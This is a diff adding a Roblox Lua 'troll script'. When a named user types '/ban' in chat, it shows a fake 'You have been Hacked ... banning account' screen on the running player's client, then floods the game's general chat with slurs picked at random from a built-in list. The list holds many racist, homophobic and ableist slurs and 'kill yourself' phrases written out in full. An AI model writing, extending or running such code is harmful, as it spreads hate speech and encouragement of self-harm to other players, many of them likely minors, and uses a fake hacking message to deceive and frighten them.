@@ -1,0 +1,146 @@
+-- Hard Slur Troll Script - Private Use Only
+local TextChatService = game:GetService("TextChatService")
+local Players = game:GetService("Players")
+local StarterGui = game:GetService("StarterGui")
+
+local TARGET_USER = "User_KVH"
+local LOCAL_PLAYER = Players.LocalPlayer
+
+-- ==================== HARD SLUR RESPONSES ====================
+local BAN_RESPONSES = {
+    "nigger",
+    "faggot",
+    "retard",
+    "cunt",
+    "bitch ass nigger",
+    "fucking faggot",
+    "kill yourself retard",
+    "stupid fucking nigger",
+    "fat retarded bitch",
+    "nigger faggot",
+    "die you worthless cunt",
+    "faggot ass nigga",
+    "pathetic fucking retard",
+    "nigger bitch",
+    "go kill yourself faggot",
+    "retarded nigger monkey",
+    -- Add more hard slurs here
+}
+
+local message = "CatBar’s script 100% loaded - /ban hard slur mode"
+
+local chatChannel
+
+-- Initial message
+if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+    chatChannel = TextChatService.TextChannels.RBXGeneral
+    chatChannel:SendAsync(message)
+else
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    local remote = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents") 
+                   and ReplicatedStorage.DefaultChatSystemChatEvents:FindFirstChild("SayMessageRequest")
+    
+    if remote then
+        remote:FireServer(message, "All")
+    else
+        StarterGui:SetCore("ChatMakeSystemMessage", {
+            Text = message,
+            Color = Color3.fromRGB(255, 0, 0),
+            Font = Enum.Font.SourceSansBold,
+            FontSize = Enum.FontSize.Size24
+        })
+    end
+end
+
+-- ==================== HACKED GUI ====================
+local function showHackedGUI()
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "HackedGUI"
+    screenGui.ResetOnSpawn = false
+    screenGui.Parent = LOCAL_PLAYER:WaitForChild("PlayerGui")
+
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(0.55, 0, 0.45, 0)
+    frame.Position = UDim2.new(0.225, 0, 0.275, 0)
+    frame.BackgroundColor3 = Color3.fromRGB(10, 0, 0)
+    frame.BorderSizePixel = 5
+    frame.BorderColor3 = Color3.fromRGB(255, 0, 0)
+    frame.Parent = screenGui
+
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, 0, 0.5, 0)
+    title.BackgroundTransparency = 1
+    title.Text = "You have been Hacked"
+    title.TextColor3 = Color3.fromRGB(255, 0, 0)
+    title.TextScaled = true
+    title.Font = Enum.Font.Arcade
+    title.Parent = frame
+
+    local subtitle = Instance.new("TextLabel")
+    subtitle.Size = UDim2.new(1, 0, 0.5, 0)
+    subtitle.Position = UDim2.new(0, 0, 0.5, 0)
+    subtitle.BackgroundTransparency = 1
+    subtitle.Text = "banning account... do not log out"
+    subtitle.TextColor3 = Color3.fromRGB(255, 50, 50)
+    subtitle.TextScaled = true
+    subtitle.Font = Enum.Font.SourceSansBold
+    subtitle.Parent = frame
+
+    spawn(function()
+        for i = 1, 35 do
+            frame.Position = frame.Position + UDim2.new(0, math.random(-10,10), 0, math.random(-10,10))
+            wait(0.03)
+        end
+    end)
+end
+
+-- ==================== TRIGGER HARD SLURS ====================
+local function triggerBanResponses()
+    if not chatChannel then return end
+    
+    showHackedGUI()
+    
+    for i = 1, 15 do
+        local response = BAN_RESPONSES[math.random(1, #BAN_RESPONSES)]
+        chatChannel:SendAsync(response)
+        wait(0.65)
+    end
+end
+
+-- ==================== COMMAND LISTENER ====================
+if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+    TextChatService.MessageReceived:Connect(function(textChatMessage)
+        local sender = textChatMessage.TextSource
+        if not sender then return end
+        
+        local player = Players:GetPlayerByUserId(sender.UserId)
+        if not player or player.Name ~= TARGET_USER then return end
+        
+        local msg = textChatMessage.Text:lower()
+        
+        if msg:find("^/ban") then
+            triggerBanResponses()
+        end
+    end)
+
+else
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    local chatEvents = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents", 5)
+    
+    if chatEvents then
+        local onMessage = chatEvents:WaitForChild("OnMessageDoneFiltering")
+        onMessage.OnClientEvent:Connect(function(data)
+            if data.SpeakerUserId and data.Message then
+                local player = Players:GetPlayerByUserId(data.SpeakerUserId)
+                if player and player.Name == TARGET_USER then
+                    local msg = data.Message:lower()
+                    if msg:find("^/ban") then
+                        triggerBanResponses()
+                    end
+                end
+            end
+        end)
+    end
+end
+
+print("✅ Hard slur /ban mode loaded - Private script active")
